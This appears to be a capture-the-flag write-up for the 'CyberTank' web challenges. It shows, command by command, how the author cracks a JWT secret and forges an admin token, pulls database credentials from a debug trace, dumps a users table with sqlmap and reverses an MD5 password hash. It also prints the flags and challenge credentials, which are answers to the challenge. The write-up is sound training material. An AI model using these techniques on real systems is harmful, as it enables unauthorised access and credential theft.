# CyberTank Website
Web

A website link was attached.

## Modifications (50 points)

> The CyberTank website is still heavily being updated as the company is still in its startup phase. There may be some leftovers from one of the recent modifications... 
> 
> Flag format: CTF{32-hex}

Let's check the website source code:

```html

        <!-- menu links -->
        <ul class="menu-links">
            <li><a href="/">Home</a></li>
            <li><a href="/members">Members</a></li>
            <!-- <li><a href="/research">Research</a></li> -->
        </ul>
```

There's a link commented out in the menu. Let's visit it:

```html
   <div class="row justify-content-center">
        You found our secret hideout... CTF{6b9639fb154dfa15b3cfb83215449fb2}
    </div>
```

## To the top (50 points)

> CyberTank's legal team has created an extensive privacy policy. It's not easy to navigate, but luckily you can easily get back to the top... or not? 
> 
> Flag format: CTF{32-hex}

If we visit the privacy policy page, we have a small icon that should take us back to the top:

```html
 <!--=================================
 back to top -->

<div class="car-top">
  <span><img src="https://cybertank-resources.s3.amazonaws.com/images/car.png" alt=""></span>
</div>
```

However, if we try to click it, it moves somewhere else.

```javascript
/*************************
      Scroll to Top
*************************/
  POTENZA.scrolltotop = function () {  
      var $scrolltop = $('.car-top');
	  
      $scrolltop.on('mouseover', function () {
          if (this.style.left.indexOf('30px') > -1) {
			this.style.left = ''
			this.style.right = '30px'
	      } else {
			this.style.right = '' 
			this.style.left = '30px'
		  }
          return false;
      });
	  
      $scrolltop.on('click', function () {
          $('html,body').animate({
                    scrollTop: 0
             }, 800);
          $(this).addClass("car-run");
		  setTimeout(function(){ 
			$('<div id="gratz" style="position:fixed; top: 5px; width: 100%; padding: 10px; z-index: 999999"><div style="background: #df1212; border: 1px solid white; padding: 10px; color: white; text-align: center">Congratulations, you got a flag ;) '+atob("Q1RGezE2ZGRmMWQyZDE4MDVkOWM1ZWRhM2FhM2E4M2UyOWI1fQ==")+'</div></div>').appendTo($('body'))
			$('#gratz').fadeIn()
		  },600);
          setTimeout(function(){ $scrolltop.removeClass('car-run');},1000);
          return false;
      });
      $window.on('scroll', function () {   
          if($window.scrollTop() >= 200) {
              $scrolltop.addClass("show");
              $scrolltop.addClass("car-down");
             } else {
               $scrolltop.removeClass("show");
               setTimeout(function(){ $scrolltop.removeClass('car-down');},300);
            }
       });
  }
```

The flag can be found in the code that moves the icon as seen above:

```javascript
atob("Q1RGezE2ZGRmMWQyZDE4MDVkOWM1ZWRhM2FhM2E4M2UyOWI1fQ==")
"CTF{16ddf1d2d1805d9c5eda3aa3a83e29b5}"
```

It's also possible to click the element using Javascript via the browser console.

## Content delivery (50 points)

> CyberTank is ready for the cloud! By making use of a content delivery network they can now accomodate their thousands of simultaneous website users! They might have pushed too much information to the cloud though... 
> 
> Flag format: CTF{32-hex}

We see that the site uses a CDN hosted on Amazon:

```console
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website# curl -s https://cybertank.challenge.hackazon.org/ | grep amazon | head
<link rel="shortcut icon" href="https://cybertank-resources.s3.amazonaws.com/images/favicon.ico" />
<link rel="stylesheet" type="text/css" href="https://cybertank-resources.s3.amazonaws.com/css/bootstrap.min.css" />
<link rel="stylesheet" type="text/css" href="https://cybertank-resources.s3.amazonaws.com/css/flaticon.css" />
<link rel="stylesheet" type="text/css" href="https://cybertank-resources.s3.amazonaws.com/css/mega-menu/mega_menu.css" />
<link rel="stylesheet" type="text/css" href="https://cybertank-resources.s3.amazonaws.com/css/font-awesome.min.css" />
<link rel="stylesheet" type="text/css" href="https://cybertank-resources.s3.amazonaws.com/css/style.css" />
<link rel="stylesheet" type="text/css" href="https://cybertank-resources.s3.amazonaws.com/css/responsive.css">
                <a href="/"><img id="logo_img" src="https://cybertank-resources.s3.amazonaws.com/images/logo-light.png" alt="logo"> </a>
  <span><img src="https://cybertank-resources.s3.amazonaws.com/images/car.png" alt=""></span>
<script type="text/javascript" src="https://cybertank-resources.s3.amazonaws.com/js/jquery-3.3.1.min.js"></script>
```

Let's visit the root URI:
```xml
<ListBucketResult>
	<Name>cybertank-resources</Name>
	<Prefix/>
	<Marker/>
	<MaxKeys>1000</MaxKeys>
	<IsTruncated>false</IsTruncated>
	<Contents>
		<Key>css/animate.min.css</Key>
		<LastModified>2020-01-26T18:07:57.000Z</LastModified>
		<ETag>"60aca30e688004a84ab7c554d257e527"</ETag>
		<Size>52789</Size>
		<StorageClass>STANDARD</StorageClass>
	</Contents>
	<Contents>
		<Key>css/bootstrap.min.css</Key>
		<LastModified>2020-01-26T18:07:57.000Z</LastModified>
		<ETag>"fee68c0f2f583161134a1fcb5950501d"</ETag>
		<Size>140421</Size>
		<StorageClass>STANDARD</StorageClass>
	</Contents>
	<Contents>
		<Key>css/flaticon.css</Key>
		<LastModified>2020-01-26T18:07:57.000Z</LastModified>
		<ETag>"73e0064fa20ac02efd8fd1d9fd93ef3a"</ETag>
		<Size>5664</Size>
		<StorageClass>STANDARD</StorageClass>
	</Contents>
	<!-- ... -->
</ListBucketResult>
```

Somewhere along the way we see:
```xml
<Contents>
	<Key>flag.txt</Key>
	<LastModified>2020-01-28T09:16:05.000Z</LastModified>
	<ETag>"b6bc3962d8d52fb2fa3442b3ee4fe6dd"</ETag>
	<Size>98</Size>
	<StorageClass>STANDARD</StorageClass>
</Contents>
```

Let's fetch it:
```console
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website# curl https://cybertank-resources.s3.amazonaws.com/flag.txt
Dumpster diving through some buckets pays off!
Have a flag: CTF{56e26470e6ee79de2488adc7354ce8f0}
```

## Tokens (75 points)

> You can access the members area using an account that doesn't even exist? How is that even possible?!
> 
> Hint: use a user id > 3 to get a flag.
> 
> Flag format: CTF{32-hex}

The site has a login form for members:

```html
<form action="" name="login" onsubmit="return verifyuser()">
	<div class="form-group">
		<label for="name">User name* </label>
		<input id="name" class="form-control" type="text" placeholder="User name" name="username">
	</div>
	<div class="form-group">
		<label for="Password">Password* </label>

		<input id="Password" class="form-control" type="password" name="password">
		</div> 
		<div class="form-group">
		</div>
		<input type="submit" value="Log in" class="button red" style="background: #db2d2e" />
	</div> 
</form>
```

Last year's PicoCTF had a similar challenge ([cereal hacker 1](/2019_picoCTF/cereal_hacker_1.md)) where the login was `guest:guest`. Surprisingly, this works here too and we get the flag:

```
Welcome guest!
Wow. You found the JWT secret! Have a flag: CTF{966ab87166c9311645a8f294824b35b4} 
```

According to the message, we weren't supposed to guess the password.

Note that we receive the following JWT cookie when logging in:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MywidXNlcm5hbWUiOiJndWVzdCIsImFjY2Vzc19sZXZlbCI6NX0.8LOXY75j_XPYmBiIz-kA5JlMZLHJnsKCl2ap3xuUsNQ
```

## Members only (50 points)

> CyberTank early members get special benefits. Can you get in? 
> 
> Flag format: CTF{32-hex}

We take the cookie from the guest login and try to crack the JWT token:

```console
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website/jwt# python ../../../pico/JaWT_Scratchpad/jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MywidXNlcm5hbWUiOiJndWVzdCIsImFjY2Vzc19sZXZlbCI6NX0.8LOXY75j_XPYmBiIz-kA5JlMZLHJnsKCl2ap3xuUsNQ > jwt.john
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website/jwt# cat jwt.john
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MywidXNlcm5hbWUiOiJndWVzdCIsImFjY2Vzc19sZXZlbCI6NX0#f0b39763be63fd73d8981888cfe900e4994c64b1c99ec2829766a9df1b94b0d4
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website/jwt# ~/utils/john/run/john jwt.john  --wordlist=/root/utils/dictionaries/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Warning: OpenMP is disabled; a non-OpenMP build may be faster
Press 'q' or Ctrl-C to abort, almost any other key for status
tank             (?)
1g 0:00:00:00 DONE (2020-01-29 19:13) 3.846g/s 401723p/s 401723c/s 401723C/s 051682..tangga
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The secret key is `tank`. Let's use [this website](https://jwt.io/) to check (and modify) the token:

```json
{
  "typ": "JWT",
  "alg": "HS256"
}

{
  "id": 3,
  "username": "guest",
  "access_level": 5
}
```

We can change it to:
```
{
  "id": 1,
  "username": "admin",
  "access_level": 1
}
```

The result, after signing with the secret, is:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImFjY2Vzc19sZXZlbCI6MX0.6XoD_y9eXpHbW772jNuZRbKS3e1hjeKmYgCzMfpmBtY
```

We modify the cookie in the browser and get the members flag:

```
Welcome admin!
We have the best members-only content for you: CTF{334c1116684195e9dbe104d181a5922a}
```

## Database (50 points)

> Looks like some sensitive information is right up for grabs... Can you find the database password? 
> 
> Flag format: CTF{32-hex}

As part of the login process, the website uses the following Javascript function:

```javascript
function verifyuser() {
	var url = 'https://nk932uo6zj.execute-api.eu-central-1.amazonaws.com/default/CyberTankAuthLambda';
	var data = { action: "login", username: document.forms.login.username.value, password: document.forms.login.password.value };
	var datatype = 'json';

	function success(response) {
		alert("Login successful.");
	 	document.cookie = 'session='+response+';';
		document.location.reload();
	}

	$.get(url, data, success, datatype).fail(function(err) { alert("Login failed.") })
	return false;
}
```

Let's try different inputs:
```console
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website# curl -s "https://nk932uo6zj.execute-api.eu-central-1.amazonaws.com/default/CyberTankAuthLambda?action=login&username=#"
File /var/task/lambda_function.py, line 70, in lambda_handler
    60   def lambda_handler(event, context):
 (...)
    66
    67                  if query['action'] == "forgot":
    68                          return ret(forgot(query['username']))
    69                  elif query['action'] == "login":
--> 70                          return ret(login(query['username'], query['password']))
    71                  else:
    ..................................................
     event = {'version': 2,
              'path': '/default/CyberTankAuthLambda',
              'httpMethod': 'GET',
              'headers': {'Content-Length': '0',
                          'Host': 'nk932uo6zj.execute-api.eu-central-1.am
              azonaws.com',
                          'User-Agent': 'curl/7.64.0',
                          'X-Amzn-Trace-Id': 'Root=1-5e32050d-39ec62fca49
              a453079fe93dc',
                          'X-Forwarded-For': '77.124.115.11',
                          'X-Forwarded-Port': '443',
                          'X-Forwarded-Proto': 'https',
                          'accept': '*/*'},
              'multiValueHeaders': {'Content...
     context = <bootstrap.LambdaContext object at 0x7f5ddead6cd0>
     query = {'action': 'login',
              'username': ''}
    ..................................................

KeyError: 'password'
```

A debug message is displayed upon error. We can see that there's also a "forgot your password" action, let's try it:

```console
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website# curl -s "https://nk932uo6zj.execute-api.eu-central-1.amazonaws.com/default/CyberTankAuthLambda?action=forgot&username=#"
File /var/task/lambda_function.py, line 68, in lambda_handler
    60   def lambda_handler(event, context):
 (...)
    64                  query = event["queryStringParameters"]
    65                  conn = pymysql.connect(rds_config.db_host, user=rds_config.db_user, passwd=rds_config.db_pass, db=rds_config.db_name, connect_timeout=5, cursorclass=pymysql.cursors.DictCursor)
    66
    67                  if query['action'] == "forgot":
--> 68                          return ret(forgot(query['username']))
    69                  elif query['action'] == "login":
    ..................................................
     event = {'version': 2,
              'path': '/default/CyberTankAuthLambda',
              'httpMethod': 'GET',
              'headers': {'Content-Length': '0',
                          'Host': 'nk932uo6zj.execute-api.eu-central-1.am
              azonaws.com',
                          'User-Agent': 'curl/7.64.0',
                          'X-Amzn-Trace-Id': 'Root=1-5e320542-cb1c072c9e6
              45c8249e569a6',
                          'X-Forwarded-For': '77.124.115.11',
                          'X-Forwarded-Port': '443',
                          'X-Forwarded-Proto': 'https',
                          'accept': '*/*'},
              'multiValueHeaders': {'Content...
     context = <bootstrap.LambdaContext object at 0x7f5ddead6e10>
     query = {'action': 'forgot',
              'username': ''}
     conn = <pymysql.connections.Connection object at 0x7f5dde777a50>
     pymysql.connect = <function 'Connect' __init__.py:88>
     rds_config.db_host = 'database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazon
                           aws.com'
     rds_config.db_user = 'cyber_ro'
     rds_config.db_pass = 'CTF{6d4efb805865d7fcc6fec9da232044a7w}'
     rds_config.db_name = 'cybertank'
     pymysql.cursors.DictCursor = <class 'pymysql.cursors.DictCursor'>
    ..................................................

File /var/task/lambda_function.py, line 36, in forgot
    32   def forgot(username):
    33          global conn
    34
    35          if not username.isalnum():
--> 36                  raise Exception("Username validation failed.")
    37
    ..................................................
     username = ''
     conn = <pymysql.connections.Connection object at 0x7f5dde777a50>
    ..................................................

Exception: Username validation failed.
```

The DB password is leaked as part of the debug information.

## Superuser (75 points)

> The superuser account can access everything. Can you find out the account's password and tell the CyberTank executives whether it's secure? 
> 
> Flag format: password

We already have the credentials and server details, just need to connect:

```console
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website# sqlmap -d "mysql://cyber_ro:CTF{6d4efb805865d7fcc6fec9da232044a7w}@database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com:3306/cybertank" --tables
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 19:34:50

[19:34:51] [INFO] connection to mysql server database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com:3306 established
[19:34:51] [INFO] testing MySQL
[19:34:51] [INFO] resumed: [[u'1']]...
[19:34:51] [INFO] confirming MySQL
[19:34:51] [INFO] resumed: [[u'1']]...
[19:34:51] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[19:34:51] [INFO] fetching database names
[19:34:52] [INFO] fetching tables for databases: 'cybertank, information_schema'
Database: information_schema
[77 tables]
+---------------------------------------+
| ALL_PLUGINS                           |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| CLIENT_STATISTICS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GEOMETRY_COLUMNS                      |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INDEX_STATISTICS                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_METRICS                        |
| INNODB_MUTEXES                        |
| INNODB_SYS_COLUMNS                    |
| INNODB_SYS_DATAFILES                  |
| INNODB_SYS_FIELDS                     |
| INNODB_SYS_FOREIGN                    |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_SYS_INDEXES                    |
| INNODB_SYS_SEMAPHORE_WAITS            |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_TABLESPACES                |
| INNODB_SYS_TABLESTATS                 |
| INNODB_SYS_VIRTUAL                    |
| INNODB_TABLESPACES_ENCRYPTION         |
| INNODB_TABLESPACES_SCRUBBING          |
| INNODB_TRX                            |
| KEY_CACHES                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| RDS_EVENTS_THREADS_WAITS_CURRENT      |
| RDS_PROCESSLIST                       |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| SPATIAL_REF_SYS                       |
| STATISTICS                            |
| SYSTEM_VARIABLES                      |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TABLE_STATISTICS                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| USER_STATISTICS                       |
| VIEWS                                 |
| user_variables                        |
+---------------------------------------+

Database: cybertank
[1 table]
+---------------------------------------+
| users                                 |
+---------------------------------------+

[19:34:52] [INFO] connection to mysql server database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com:3306 closed

[*] shutting down at 19:34:52

root@kali:/media/sf_CTFs/hackazon/CyberTank_Website# sqlmap -d "mysql://cyber_ro:CTF{6d4efb805865d7fcc6fec9da232044a7w}@database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com:3306/cybertank" --dump -T users
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.5#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 19:35:20

[19:35:20] [INFO] connection to mysql server database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com:3306 established
[19:35:20] [INFO] testing MySQL
[19:35:20] [INFO] resumed: [[u'1']]...
[19:35:20] [INFO] confirming MySQL
[19:35:20] [INFO] resumed: [[u'1']]...
[19:35:21] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[19:35:21] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[19:35:21] [INFO] fetching current database
[19:35:21] [INFO] fetching columns for table 'users' in database 'cybertank'
[19:35:21] [INFO] fetching entries for table 'users' in database 'cybertank'
[19:35:21] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: cybertank
Table: users
[3 entries]
+----+-----------+----------------------------------+--------------+
| id | username  | password                         | access_level |
+----+-----------+----------------------------------+--------------+
| 1  | superuser | 79839a6b78cf257a31d976cd8a381760 | 1            |
| 2  | admin     | 21232f297a57a5a743894a0e4a801fc3 | 2            |
| 3  | guest     | 084e0343a0486ff05530df6c705c8bb4 | 5            |
+----+-----------+----------------------------------+--------------+

[19:35:32] [INFO] table 'cybertank.users' dumped to CSV file '/root/.sqlmap/output/database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com/dump/cybertank/users.csv'
[19:35:32] [INFO] connection to mysql server database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com:3306 closed

[*] shutting down at 19:35:32

```

If we search Google for the superuser's password hash, we find that it's the MD5 of `cybertrix`:

```console
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website# echo -n cybertrix | md5sum
79839a6b78cf257a31d976cd8a381760  -
```